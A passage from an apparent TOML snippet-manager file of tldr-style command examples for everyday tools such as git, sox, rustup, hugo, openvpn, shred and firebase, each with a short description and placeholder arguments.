  command = "maza update"
  output = ""

[[snippets]]
  description = "Start Maza"
  command = "sudo maza start"
  output = ""

[[snippets]]
  description = "Stop Maza"
  command = "sudo maza stop"
  output = ""

[[snippets]]
  description = "Show the status of Maza"
  command = "maza status"
  output = ""

[[snippets]]
  description = "Generate a development server that will run at http://localhost:4000/"
  command = "jekyll serve"
  output = ""

[[snippets]]
  description = "Enable incremental regeneration"
  command = "jekyll serve --incremental"
  output = ""

[[snippets]]
  description = "Enable verbose output"
  command = "jekyll serve --verbose"
  output = ""

[[snippets]]
  description = "Generate the current directory into `./_site`"
  command = "jekyll build"
  output = ""

[[snippets]]
  description = "Clean the site (removes site output and `cache` directory) without building"
  command = "jekyll clean"
  output = ""

[[snippets]]
  description = "Convert a PNM image to a SIR image"
  command = "pnmtosir <path/to/input.pnm> > <path/to/output.sir>"
  output = ""

[[snippets]]
  description = "Replace a sensitive string in all files"
  command = "git filter-repo --replace-text <(echo '<find>==><replacement>')"
  output = ""

[[snippets]]
  description = "Extract a single folder, keeping history"
  command = "git filter-repo --path <path/to/folder>"
  output = ""

[[snippets]]
  description = "Remove a single folder, keeping history"
  command = "git filter-repo --path <path/to/folder> --invert-paths"
  output = ""

[[snippets]]
  description = "Move everything from sub-folder one level up"
  command = "git filter-repo --path-rename <path/to/folder/:>"
  output = ""

[[snippets]]
  description = "List connected Solos"
  command = "solo ls"
  output = ""

[[snippets]]
  description = "Update the currently connected Solo's firmware to the latest version"
  command = "solo key update"
  output = ""

[[snippets]]
  description = "Blink the LED of a specific Solo"
  command = "solo key wink --serial <serial_number>"
  output = ""

[[snippets]]
  description = "Generate random bytes using the currently connected Solo's secure random number generator"
  command = "solo key rng raw"
  output = ""

[[snippets]]
  description = "Monitor the serial output of a Solo"
  command = "solo monitor <path/to/serial_port>"
  output = ""

[[snippets]]
  description = "Apply the "alpha trimmed mean" filter with the specified alpha and radius values onto the PNM image"
  command = "pnmnlfilt <0.0..0.5> <radius> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Apply the "optimal estimation smoothing" filter with the specified noise threshold and radius onto the PNM image"
  command = "pnmnlfilt <1.0..2.0> <radius> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Apply the "edge enhancement" filter with the specified alpha and radius onto the PNM image"
  command = "pnmnlfilt <-0.9..(-0.1)> <radius> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xzgrep"
  output = ""

[[snippets]]
  description = "Trash specific files and directories into the current trashcan"
  command = "trash-put <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Remove specific files from the current trashcan"
  command = "trash-rm <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Empty the current trashcan"
  command = "trash-empty"
  output = ""

[[snippets]]
  description = "List trashed files and directories in the current trashcan"
  command = "trash-list"
  output = ""

[[snippets]]
  description = "Restore a specific file or directory by a number from the displayed list from the current trashcan"
  command = "trash-restore"
  output = ""

[[snippets]]
  description = "Find lines that match pattern in a PDF"
  command = "pdfgrep <pattern> <file.pdf>"
  output = ""

[[snippets]]
  description = "Include file name and page number for each matched line"
  command = "pdfgrep --with-filename --page-number <pattern> <file.pdf>"
  output = ""

[[snippets]]
  description = "Do a case-insensitive search for lines that begin with "foo" and return the first 3 matches"
  command = "pdfgrep --max-count <3> --ignore-case <'^foo'> <file.pdf>"
  output = ""

[[snippets]]
  description = "Find pattern in files with a `.pdf` extension in the current directory recursively"
  command = "pdfgrep --recursive <pattern>"
  output = ""

[[snippets]]
  description = "Find pattern on files that match a specific glob in the current directory recursively"
  command = "pdfgrep --recursive --include <'*book.pdf'> <pattern>"
  output = ""

[[snippets]]
  description = "Search for a string in tracked files"
  command = "git grep <search_string>"
  output = ""

[[snippets]]
  description = "Search for a string in files matching a pattern in tracked files"
  command = "git grep <search_string> -- <file_glob_pattern>"
  output = ""

[[snippets]]
  description = "Search for a string in tracked files, including submodules"
  command = "git grep --recurse-submodules <search_string>"
  output = ""

[[snippets]]
  description = "Search for a string at a specific point in history"
  command = "git grep <search_string> <HEAD~2>"
  output = ""

[[snippets]]
  description = "Search for a string across all branches"
  command = "git grep <search_string> $(git rev-list --all)"
  output = ""

[[snippets]]
  description = "Clone the specified VM"
  command = "VBoxManage clonevm <vm_name>"
  output = ""

[[snippets]]
  description = "Specify a new name for the new VM"
  command = "VBoxManage clonevm <vm_name> --name <new_vm_name>"
  output = ""

[[snippets]]
  description = "Indicate the folder where the new VM configuration is saved"
  command = "VBoxManage clonevm <vm_name> --basefolder <path/to/directory>"
  output = ""

[[snippets]]
  description = "Register the cloned VM in VirtualBox"
  command = "VBoxManage clonevm <vm_name> --register"
  output = ""

[[snippets]]
  description = "Merge two audio files into one"
  command = "sox -m <path/to/input_audio1> <path/to/input_audio2> <path/to/output_audio>"
  output = ""

[[snippets]]
  description = "Trim an audio file to the specified times"
  command = "sox <path/to/input_audio> <path/to/output_audio> trim <start> <end>"
  output = ""

[[snippets]]
  description = "Normalize an audio file (adjust volume to the maximum peak level, without clipping)"
  command = "sox --norm <path/to/input_audio> <path/to/output_audio>"
  output = ""

[[snippets]]
  description = "Reverse and save an audio file"
  command = "sox <path/to/input_audio> <path/to/output_audio> reverse"
  output = ""

[[snippets]]
  description = "Print statistical data of an audio file"
  command = "sox <path/to/input_audio> -n stat"
  output = ""

[[snippets]]
  description = "Increase the volume of an audio file by 2x"
  command = "sox -v 2.0 <path/to/input_audio> <path/to/output_audio>"
  output = ""

[[snippets]]
  description = "View documentation for the current command"
  command = "tldr pamoil"
  output = ""

[[snippets]]
  description = "List all available generators"
  command = "rails generate"
  output = ""

[[snippets]]
  description = "Generate a new model named Post with attributes title and body"
  command = "rails generate model <Post> <title:string> <body:text>"
  output = ""

[[snippets]]
  description = "Generate a new controller named Posts with actions index, show, new and create"
  command = "rails generate controller <Posts> <index> <show> <new> <create>"
  output = ""

[[snippets]]
  description = "Generate a new migration that adds a category attribute to an existing model called Post"
  command = "rails generate migration <AddCategoryToPost> <category:string>"
  output = ""

[[snippets]]
  description = "Generate a scaffold for a model named Post, predefining the attributes title and body"
  command = "rails generate scaffold <Post> <title:string> <body:text>"
  output = ""

[[snippets]]
  description = "Install a specific application"
  command = "cs install <application_name>"
  output = ""

[[snippets]]
  description = "Install a specific version of an application"
  command = "cs install <application_name>:<application_version>"
  output = ""

[[snippets]]
  description = "Search an application by a specific name"
  command = "cs search <application_partial_name>"
  output = ""

[[snippets]]
  description = "Update a specific application if available"
  command = "cs update <application_name>"
  output = ""

[[snippets]]
  description = "Update all the installed applications"
  command = "cs update"
  output = ""

[[snippets]]
  description = "Uninstall a specific application"
  command = "cs uninstall <application_name>"
  output = ""

[[snippets]]
  description = "List all installed applications"
  command = "cs list"
  output = ""

[[snippets]]
  description = "Pass specific Java options to an installed application"
  command = "<application_name> <-Jjava_option_name1=value1 -Jjava_option_name2=value2 ...>"
  output = ""

[[snippets]]
  description = "Interactively log into a registry"
  command = "docker login"
  output = ""

[[snippets]]
  description = "Log into a registry with a specific username (user will be prompted for a password)"
  command = "docker login --username <username>"
  output = ""

[[snippets]]
  description = "Log into a registry with username and password"
  command = "docker login --username <username> --password <password> <server>"
  output = ""

[[snippets]]
  description = "Log into a registry with password from `stdin`"
  command = "echo ""<password>"" | docker login --username <username> --password-stdin"
  output = ""

[[snippets]]
  description = "Open the current directory"
  command = "vifm ."
  output = ""

[[snippets]]
  description = "Open specified directories on left or right plane"
  command = "vifm <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Convert a PBM image into a GEM .img file"
  command = "pbmtogem <path/to/file.pbm> > <path/to/file.img>"
  output = ""

[[snippets]]
  description = "Suppress all informational messages"
  command = "pbmtogem -quiet"
  output = ""

[[snippets]]
  description = "Display version"
  command = "pbmtogem -version"
  output = ""

[[snippets]]
  description = "Tail all files matching a pattern in a single stream"
  command = "multitail -Q 1 '<pattern>'"
  output = ""

[[snippets]]
  description = "Tail all files in a directory in a single stream"
  command = "multitail -Q 1 '<path/to/directory>/*'"
  output = ""

[[snippets]]
  description = "Automatically add new files to a window"
  command = "multitail -Q <pattern>"
  output = ""

[[snippets]]
  description = "Show 5 logfiles while merging 2 and put them in 2 columns with only one in the left column"
  command = "multitail -s 2 -sn 1,3 <path/to/mergefile> -I <path/to/file1> <path/to/file2> <path/to/file3> <path/to/file4>"
  output = ""

[[snippets]]
  description = "Open the source of the Nix expression of a package from nixpkgs in your `$EDITOR`"
  command = "nix edit <nixpkgs#pkg>"
  output = ""

[[snippets]]
  description = "Dump the source of a package to `stdout`"
  command = "EDITOR=cat nix edit <nixpkgs#pkg>"
  output = ""

[[snippets]]
  description = "Open a new Alacritty window"
  command = "alacritty"
  output = ""

[[snippets]]
  description = "Run in a specific directory"
  command = "alacritty --working-directory <path/to/directory>"
  output = ""

[[snippets]]
  description = "[e]xecute a command in a new Alacritty window"
  command = "alacritty -e <command>"
  output = ""

[[snippets]]
  description = "Use an alternative configuration file (defaults to `$XDG_CONFIG_HOME/alacritty/alacritty.yml`)"
  command = "alacritty --config-file <path/to/config.yml>"
  output = ""

[[snippets]]
  description = "Run with live configuration reload enabled (can also be enabled by default in `alacritty.yml`)"
  command = "alacritty --live-config-reload --config-file <path/to/config.yml>"
  output = ""

[[snippets]]
  description = "Remove all unused formulae"
  command = "brew autoremove"
  output = ""

[[snippets]]
  description = "Print what would be removed, but don't actually remove anything"
  command = "brew autoremove --dry-run"
  output = ""

[[snippets]]
  description = "Merge two PDFs into one with the default suffix "joined""
  command = "pdfjoin <path/to/file1.pdf> <path/to/file2.pdf>"
  output = ""

[[snippets]]
  description = "Merge the first page of each given file together"
  command = "pdfjoin <path/to/file1.pdf path/to/file2.pdf ...> <1> --outfile <output_file>"
  output = ""

[[snippets]]
  description = "Save pages 3 to 5 followed by page 1 to a new PDF with custom suffix"
  command = "pdfjoin <path/to/file.pdf> <3-5,1> --suffix <rearranged>"
  output = ""

[[snippets]]
  description = "Merge page subranges from two PDFs"
  command = "pdfjoin {/path/to/file1.pdf> <2-> <file2> <last-3> --outfile <output_file>"
  output = ""

[[snippets]]
  description = "View the current IFS value"
  command = "echo ""$IFS"""
  output = ""

[[snippets]]
  description = "Change the IFS value"
  command = "IFS=""<:>"""
  output = ""

[[snippets]]
  description = "Reset IFS to default"
  command = "IFS=$' \t\n'"
  output = ""

[[snippets]]
  description = "Temporarily change the IFS value in a subshell"
  command = "(IFS=""<:>""; echo ""<one:two:three>"")"
  output = ""

[[snippets]]
  description = "Render a `png` image with a filename based on the input filename and output format (uppercase -O)"
  command = "fdp -T png -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `svg` image with the specified output filename (lowercase -o)"
  command = "fdp -T svg -o <path/to/image.svg> <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render the output in a specific format"
  command = "fdp -T <ps|pdf|svg|fig|png|gif|jpg|json|dot> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `gif` image using `stdin` and `stdout`"
  command = "echo ""<digraph {this -> that} >"" | fdp -T gif > <path/to/image.gif>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "fdp -?"
  output = ""

[[snippets]]
  description = "View documentation for the recommended replacement"
  command = "tldr flock"
  output = ""

[[snippets]]
  description = "Check the last commit message"
  command = "gitlint"
  output = ""

[[snippets]]
  description = "The range of commits to lint"
  command = "gitlint --commits <single_refspec_argument>"
  output = ""

[[snippets]]
  description = "Path to a directory or Python module with extra user-defined rules"
  command = "gitlint --extra-path <path/to/directory>"
  output = ""

[[snippets]]
  description = "Start a specific CI job"
  command = "gitlint --target <path/to/target_directory>"
  output = ""

[[snippets]]
  description = "Path to a file containing a commit-msg"
  command = "gitlint --msg-filename <path/to/filename>"
  output = ""

[[snippets]]
  description = "Read staged commit meta-info from the local repository"
  command = "gitlint --staged"
  output = ""

[[snippets]]
  description = "Convert the image data in a PS file to a PGM image of the specified dimensions and quality"
  command = "psidtopgm <width> <height> <bits_per_sample> <path/to/file.ps> > <path/to/image.pgm>"
  output = ""

[[snippets]]
  description = "Perform a topological sort consistent with a partial sort per line of input separated by blanks"
  command = "tsort <path/to/file>"
  output = ""

[[snippets]]
  description = "Perform a topological sort consistent on strings"
  command = "echo -e ""<UI Backend\nBackend Database\nDocs UI>"" | tsort"
  output = ""

[[snippets]]
  description = "Convert a CMU window manager bitmap to a PBM image"
  command = "cmuwmtopbm <path/to/image.pbm> > <path/to/output.bmp>"
  output = ""

[[snippets]]
  description = "Pipe two commands and return the exit status of the first command"
  command = "mispipe <command1> <command2>"
  output = ""

[[snippets]]
  description = "Run the `default` Rakefile task"
  command = "rake"
  output = ""

[[snippets]]
  description = "Run a specific task"
  command = "rake <task>"
  output = ""

[[snippets]]
  description = "Execute `n` jobs at a time in parallel (number of CPU cores + 4 by default)"
  command = "rake --jobs <n>"
  output = ""

[[snippets]]
  description = "Use a specific Rakefile"
  command = "rake --rakefile <path/to/Rakefile>"
  output = ""

[[snippets]]
  description = "Execute `rake` from another directory"
  command = "rake --directory <path/to/directory>"
  output = ""

[[snippets]]
  description = "Convert a QOI image to Netpbm"
  command = "qoitopam <path/to/image.qoi> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Create an empty file of 15 kilobytes"
  command = "mkfile -n <15k> <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a file of a given size and unit (bytes, KB, MB, GB)"
  command = "mkfile -n <size><b|k|m|g> <path/to/file>"
  output = ""

[[snippets]]
  description = "Create two files of 4 megabytes each"
  command = "mkfile -n <4m> <first_filename> <second_filename>"
  output = ""

[[snippets]]
  description = "Clone a repository using its slug (owners can omit the username)"
  command = "hub clone <username>/<repo_name>"
  output = ""

[[snippets]]
  description = "Create a fork of the current repository (cloned from another user) under your GitHub profile"
  command = "hub fork"
  output = ""

[[snippets]]
  description = "Push the current local branch to GitHub and create a PR for it in the original repository"
  command = "hub push <remote_name> && hub pull-request"
  output = ""

[[snippets]]
  description = "Create a PR of the current (already pushed) branch, reusing the message from the first commit"
  command = "hub pull-request --no-edit"
  output = ""

[[snippets]]
  description = "Create a new branch with the contents of a pull request and switch to it"
  command = "hub pr checkout <pr_number>"
  output = ""

[[snippets]]
  description = "Upload the current (local-only) repository to your GitHub account"
  command = "hub create"
  output = ""

[[snippets]]
  description = "Fetch Git objects from upstream and update local branches"
  command = "hub sync"
  output = ""

[[snippets]]
  description = "Play test video in a window"
  command = "gst-launch-1.0 videotestsrc ! xvimagesink"
  output = ""

[[snippets]]
  description = "Play a media file in a window"
  command = "gst-launch-1.0 playbin uri=<protocol>://<host>/<path/to/file>"
  output = ""

[[snippets]]
  description = "Re-encode a media file"
  command = "gst-launch-1.0 filesrc location=<path/to/file> ! <file_type>demux ! <codec_type>dec ! <codec_type>enc ! <file_type>mux ! filesink location=<path/to/file>"
  output = ""

[[snippets]]
  description = "Stream a file to an RTSP server"
  command = "gst-launch-1.0 filesrc location=<path/to/file> ! rtspclientsink location=rtsp://<host_IP>/<path/to/file>"
  output = ""

[[snippets]]
  description = "Install the nightly toolchain for your system"
  command = "rustup install nightly"
  output = ""

[[snippets]]
  description = "Switch the default toolchain to nightly so that the `cargo` and `rustc` commands will use it"
  command = "rustup default nightly"
  output = ""

[[snippets]]
  description = "Use the nightly toolchain when inside the current project but leave global settings unchanged"
  command = "rustup override set nightly"
  output = ""

[[snippets]]
  description = "Update all toolchains"
  command = "rustup update"
  output = ""

[[snippets]]
  description = "List installed toolchains"
  command = "rustup show"
  output = ""

[[snippets]]
  description = "Run `cargo build` with a certain toolchain"
  command = "rustup run <toolchain> cargo build"
  output = ""

[[snippets]]
  description = "Open the local Rust documentation in the default web browser"
  command = "rustup doc"
  output = ""

[[snippets]]
  description = "List available commands"
  command = "robo list"
  output = ""

[[snippets]]
  description = "Run a specific command"
  command = "robo <foo>"
  output = ""

[[snippets]]
  description = "Simulate running a specific command"
  command = "robo --simulate <foo>"
  output = ""

[[snippets]]
  description = "List directiory toolchain overrides"
  command = "rustup override list"
  output = ""

[[snippets]]
  description = "Set the override toolchain for the current directory (i.e. tell `rustup` to run `cargo`, `rustc`, etc. from a specific toolchain when in that directory)"
  command = "rustup override set <toolchain>"
  output = ""

[[snippets]]
  description = "Remove the toolchain override for the current directory"
  command = "rustup override unset"
  output = ""

[[snippets]]
  description = "Remove all toolchain overrides for directories that no longer exist"
  command = "rustup override unset --nonexistent"
  output = ""

[[snippets]]
  description = "Display general information about the OpenPGP application"
  command = "ykman openpgp info"
  output = ""

[[snippets]]
  description = "Set the number of retry attempts for the User PIN, Reset Code, and Admin PIN, respectively"
  command = "ykman openpgp access set-retries <3> <3> <3>"
  output = ""

[[snippets]]
  description = "Change the User PIN, Reset Code or Admin PIN"
  command = "ykman openpgp access change-<pin|reset-code|admin-pin>"
  output = ""

[[snippets]]
  description = "Factory reset the OpenPGP application (you have to do this after exceeding the number of Admin PIN retry attempts)"
  command = "ykman openpgp reset"
  output = ""

[[snippets]]
  description = "Display information about an existing MP4 file"
  command = "mp4box -info <path/to/file>"
  output = ""

[[snippets]]
  description = "Add an SRT subtitle file into an MP4 file"
  command = "mp4box -add <input_subs.srt>:lang=eng -add <input.mp4> <output.mp4>"
  output = ""

[[snippets]]
  description = "Combine audio from one file and video from another"
  command = "mp4box -add <input1.mp4>#audio -add <input2.mp4>#video <output.mp4>"
  output = ""

[[snippets]]
  description = "Produce a packing of the specified images"
  command = "pnmmontage <path/to/image1.pnm path/to/image2.pnm ...> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Specify the quality of the packing (Note: larger values produce smaller packings but take longer to compute.)"
  command = "pnmmontage -<0..9> <path/to/image1.pnm path/to/image2.pnm ...> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Produce a packing that is not larger than `p` percent of the optimal packing"
  command = "pnmmontage -quality <p> <path/to/image1.pnm path/to/image2.pnm ...> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Write the positions of the input files within the packed image to a machine-readable file"
  command = "pnmmontage -data <path/to/datafile> <path/to/image1.pnm path/to/image2.pnm ...> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Launch a "Getting Started" workflow"
  command = "gcloud init"
  output = ""

[[snippets]]
  description = "Launch a workflow without diagnostics"
  command = "gcloud init --skip-diagnostics"
  output = ""

[[snippets]]
  description = "Use the console for authentication"
  command = "gcloud init --console-only"
  output = ""

[[snippets]]
  description = "Diff the changes of two individual commits"
  command = "git range-diff <commit_1>^! <commit_2>^!"
  output = ""

[[snippets]]
  description = "Diff the changes of ours and theirs from their common ancestor, e.g. after an interactive rebase"
  command = "git range-diff <theirs>...<ours>"
  output = ""

[[snippets]]
  description = "Diff the changes of two commit ranges, e.g. to check whether conflicts have been resolved appropriately when rebasing commits from `base1` to `base2`"
  command = "git range-diff <base1>..<rev1> <base2>..<rev2>"
  output = ""

[[snippets]]
  description = "Connect to server using a configuration file"
  command = "sudo openvpn <path/to/client.conf>"
  output = ""

[[snippets]]
  description = "Try to set up an insecure peer-to-peer tunnel on bob.example.com host"
  command = "sudo openvpn --remote <alice.example.com> --dev <tun1> --ifconfig <10.4.0.1> <10.4.0.2>"
  output = ""

[[snippets]]
  description = "Connect to the awaiting bob.example.com host without encryption"
  command = "sudo openvpn --remote <bob.example.com> --dev <tun1> --ifconfig <10.4.0.2> <10.4.0.1>"
  output = ""

[[snippets]]
  description = "Create a cryptographic key and save it to file"
  command = "openvpn --genkey secret <path/to/key>"
  output = ""

[[snippets]]
  description = "Try to set up a peer-to-peer tunnel on bob.example.com host with a static key"
  command = "sudo openvpn --remote <alice.example.com> --dev <tun1> --ifconfig <10.4.0.1> <10.4.0.2> --secret <path/to/key>"
  output = ""

[[snippets]]
  description = "Connect to the awaiting bob.example.com host with the same static key as on bob.example.com"
  command = "sudo openvpn --remote <bob.example.com> --dev <tun1> --ifconfig <10.4.0.2> <10.4.0.1> --secret <path/to/key>"
  output = ""

[[snippets]]
  description = "Run an optimization or analysis on a bitcode file"
  command = "opt -<passname> <path/to/file.bc> -S -o <file_opt.bc>"
  output = ""

[[snippets]]
  description = "Output the Control Flow Graph of a function to a `.dot` file"
  command = "opt <-dot-cfg> -S <path/to/file.bc> -disable-output"
  output = ""

[[snippets]]
  description = "Optimize the program at level 2 and output the result to another file"
  command = "opt -O2 <path/to/file.bc> -S -o <path/to/output_file.bc>"
  output = ""

[[snippets]]
  description = "Create a new Hugo site"
  command = "hugo new site <path/to/site>"
  output = ""

[[snippets]]
  description = "Create a new Hugo theme (themes may also be downloaded from <https://themes.gohugo.io/>)"
  command = "hugo new theme <theme_name>"
  output = ""

[[snippets]]
  description = "Create a new page"
  command = "hugo new <section_name>/<page_name>"
  output = ""

[[snippets]]
  description = "Build a site to the `./public/` directory"
  command = "hugo"
  output = ""

[[snippets]]
  description = "Build a site including pages that are marked as a "draft""
  command = "hugo --buildDrafts"
  output = ""

[[snippets]]
  description = "Build a site on your local IP"
  command = "hugo server --bind <local-ip> --baseURL <http://local-ip>"
  output = ""

[[snippets]]
  description = "Build a site to a given directory"
  command = "hugo --destination <path/to/destination>"
  output = ""

[[snippets]]
  description = "Build a site, start up a webserver to serve it, and automatically reload when pages are edited"
  command = "hugo server"
  output = ""

[[snippets]]
  description = "Run a script"
  command = "coffee <path/to/file.coffee>"
  output = ""

[[snippets]]
  description = "Compile to JavaScript and save to a file with the same name"
  command = "coffee --compile <path/to/file.coffee>"
  output = ""

[[snippets]]
  description = "Compile to JavaScript and save to a given output file"
  command = "coffee --compile <path/to/file.coffee> --output <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "coffee --interactive"
  output = ""

[[snippets]]
  description = "Watch script for changes and re-run script"
  command = "coffee --watch <path/to/file.coffee>"
  output = ""

[[snippets]]
  description = "Count all lines in a file"
  command = "wc --lines <path/to/file>"
  output = ""

[[snippets]]
  description = "Count all words in a file"
  command = "wc --words <path/to/file>"
  output = ""

[[snippets]]
  description = "Count all bytes in a file"
  command = "wc --bytes <path/to/file>"
  output = ""

[[snippets]]
  description = "Count all characters in a file (taking multi-byte characters into account)"
  command = "wc --chars <path/to/file>"
  output = ""

[[snippets]]
  description = "Count all lines, words and bytes from `stdin`"
  command = "<find .> | wc"
  output = ""

[[snippets]]
  description = "Count the length of the longest line in number of characters"
  command = "wc --max-line-length <path/to/file>"
  output = ""

[[snippets]]
  description = "Start an interactive editor session with an empty document"
  command = "ed"
  output = ""

[[snippets]]
  description = "Start an interactive editor session with an empty document and a specific prompt"
  command = "ed --prompt='> '"
  output = ""

[[snippets]]
  description = "Start an interactive editor session with user-friendly errors"
  command = "ed --verbose"
  output = ""

[[snippets]]
  description = "Start an interactive editor session with an empty document and without diagnostics, byte counts and '!' prompt"
  command = "ed --quiet"
  output = ""

[[snippets]]
  description = "Start an interactive editor session without exit status change when command fails"
  command = "ed --loose-exit-status"
  output = ""

[[snippets]]
  description = "Edit a specific file (this shows the byte count of the loaded file)"
  command = "ed <path/to/file>"
  output = ""

[[snippets]]
  description = "Replace a string with a specific replacement for all lines"
  command = ",s/<regular_expression>/<replacement>/g"
  output = ""

[[snippets]]
  description = "Deploy the current directory"
  command = "vercel"
  output = ""

[[snippets]]
  description = "Deploy the current directory to production"
  command = "vercel --prod"
  output = ""

[[snippets]]
  description = "Deploy a directory"
  command = "vercel <path/to/project>"
  output = ""

[[snippets]]
  description = "Initialize an example project"
  command = "vercel init"
  output = ""

[[snippets]]
  description = "Deploy with Environment Variables"
  command = "vercel --env <ENV>=<var>"
  output = ""

[[snippets]]
  description = "Build with Environment Variables"
  command = "vercel --build-env <ENV>=<var>"
  output = ""

[[snippets]]
  description = "Set default regions to enable the deployment on"
  command = "vercel --regions <region_id>"
  output = ""

[[snippets]]
  description = "Remove a deployment"
  command = "vercel remove <project_name>"
  output = ""

[[snippets]]
  description = "Start ELinks"
  command = "elinks"
  output = ""

[[snippets]]
  description = "Quit elinks"
  command = "<Ctrl> + C"
  output = ""

[[snippets]]
  description = "Dump output of webpage to console, colorizing the text with ANSI control codes"
  command = "elinks -dump -dump-color-mode <1> <url>"
  output = ""

[[snippets]]
  description = "Display the system's architecture"
  command = "arch"
  output = ""

[[snippets]]
  description = "Get quotes for currencies and stocks specified in a file and print them"
  command = "gnucash-cli --quotes get <path/to/file.gnucash>"
  output = ""

[[snippets]]
  description = "Generate a financial report of a specific type, specified by `--name`"
  command = "gnucash-cli --report run --name ""<Balance Sheet>"" <path/to/file.gnucash>"
  output = ""

[[snippets]]
  description = "Analyze the current working directory"
  command = "ncdu"
  output = ""

[[snippets]]
  description = "Colorize output"
  command = "ncdu --color <dark|off>"
  output = ""

[[snippets]]
  description = "Analyze a given directory"
  command = "ncdu <path/to/directory>"
  output = ""

[[snippets]]
  description = "Save results to a file"
  command = "ncdu -o <path/to/file>"
  output = ""

[[snippets]]
  description = "Exclude files that match a pattern, argument can be given multiple times to add more patterns"
  command = "ncdu --exclude '<*.txt>'"
  output = ""

[[snippets]]
  description = "Stash current changes, except new (untracked) files"
  command = "git stash push -m <optional_stash_message>"
  output = ""

[[snippets]]
  description = "Stash current changes, including new (untracked) files"
  command = "git stash -u"
  output = ""

[[snippets]]
  description = "Interactively select parts of changed files for stashing"
  command = "git stash -p"
  output = ""

[[snippets]]
  description = "List all stashes (shows stash name, related branch and message)"
  command = "git stash list"
  output = ""

[[snippets]]
  description = "Show the changes as a patch between the stash (default is `stash@{0}`) and the commit back when stash entry was first created"
  command = "git stash show -p <stash@{0>}"
  output = ""

[[snippets]]
  description = "Apply a stash (default is the latest, named stash@{0})"
  command = "git stash apply <optional_stash_name_or_commit>"
  output = ""

[[snippets]]
  description = "Drop or apply a stash (default is stash@{0}) and remove it from the stash list if applying doesn't cause conflicts"
  command = "git stash pop <optional_stash_name>"
  output = ""

[[snippets]]
  description = "Drop all stashes"
  command = "git stash clear"
  output = ""

[[snippets]]
  description = "Validate the current commit"
  command = "core-validate-commit"
  output = ""

[[snippets]]
  description = "Validate a specific commit"
  command = "core-validate-commit <commit_hash>"
  output = ""

[[snippets]]
  description = "Validate a range of commits"
  command = "git rev-list <commit_hash>..HEAD | xargs core-validate-commit"
  output = ""

[[snippets]]
  description = "List all validation rules"
  command = "core-validate-commit --list"
  output = ""

[[snippets]]
  description = "List all valid Node.js subsystems"
  command = "core-validate-commit --list-subsystem"
  output = ""

[[snippets]]
  description = "Validate the current commit formatting the output in tap format"
  command = "core-validate-commit --tap"
  output = ""

[[snippets]]
  description = "Display help"
  command = "core-validate-commit --help"
  output = ""

[[snippets]]
  description = "List local branches (current branch is highlighted by `*`)"
  command = "dolt branch"
  output = ""

[[snippets]]
  description = "List all local and remote branches"
  command = "dolt branch --all"
  output = ""

[[snippets]]
  description = "Create a new branch based on the current branch"
  command = "dolt branch <branch_name>"
  output = ""

[[snippets]]
  description = "Create a new branch with the specified commit as the latest"
  command = "dolt branch <branch_name> <commit>"
  output = ""

[[snippets]]
  description = "Rename a branch"
  command = "dolt branch --move <branch_name1> <branch_name2>"
  output = ""

[[snippets]]
  description = "Duplicate a branch"
  command = "dolt branch --copy <branch_name1> <branch_name2>"
  output = ""

[[snippets]]
  description = "Delete a branch"
  command = "dolt branch --delete <branch_name>"
  output = ""

[[snippets]]
  description = "Display the name of the current branch"
  command = "dolt branch --show-current"
  output = ""

[[snippets]]
  description = "Display a [f]orecast using metric [u]nits for the next seven days for a specific [l]ocation"
  command = "ansiweather -u metric -f 7 -l <Rzeszow,PL>"
  output = ""

[[snippets]]
  description = "Display a [F]orecast for the next five days showing [s]ymbols and [d]aylight data for your current location"
  command = "ansiweather -F -s true -d true"
  output = ""

[[snippets]]
  description = "Display today's [w]ind and [h]umidity data for your current location"
  command = "ansiweather -w true -h true"
  output = ""

[[snippets]]
  description = "Overwrite a file"
  command = "shred <path/to/file>"
  output = ""

[[snippets]]
  description = "Overwrite a file and show progress on the screen"
  command = "shred --verbose <path/to/file>"
  output = ""

[[snippets]]
  description = "Overwrite a file, leaving [z]eros instead of random data"
  command = "shred --zero <path/to/file>"
  output = ""

[[snippets]]
  description = "Overwrite a file a specific [n]umber of times"
  command = "shred --iterations <25> <path/to/file>"
  output = ""

[[snippets]]
  description = "Overwrite a file and remove it"
  command = "shred --remove <path/to/file>"
  output = ""

[[snippets]]
  description = "Overwrite a file 100 times, add a final overwrite with [z]eros, remove the file after overwriting it and show [v]erbose progress on the screen"
  command = "shred -vzun 100 <path/to/file>"
  output = ""

[[snippets]]
  description = "Run all request files from the current directory"
  command = "bru run"
  output = ""

[[snippets]]
  description = "Run a single request from the current directory by specifying its filename"
  command = "bru run <file.bru>"
  output = ""

[[snippets]]
  description = "Run requests using an environment"
  command = "bru run --env <environment_name>"
  output = ""

[[snippets]]
  description = "Run requests using an environment with a variable"
  command = "bru run --env <environment_name> --env-var <variable_name>=<variable_value>"
  output = ""

[[snippets]]
  description = "Run request and collect the results in an output file"
  command = "bru run --output <path/to/output.json>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "bru run --help"
  output = ""

[[snippets]]
  description = "Log in to <https://console.firebase.google.com>"
  command = "firebase login"
  output = ""

[[snippets]]
  description = "List existing Firebase projects"
  command = "firebase projects:list"
  output = ""

[[snippets]]
  description = "Start an interactive wizard to create a Firebase project in the current directory"
  command = "firebase init"
  output = ""

[[snippets]]
  description = "Deploy code and assets to the current Firebase project"
  command = "firebase deploy"
  output = ""

[[snippets]]
  description = "Start a local server to statically host the current Firebase project's assets"
  command = "firebase serve"
  output = ""

[[snippets]]
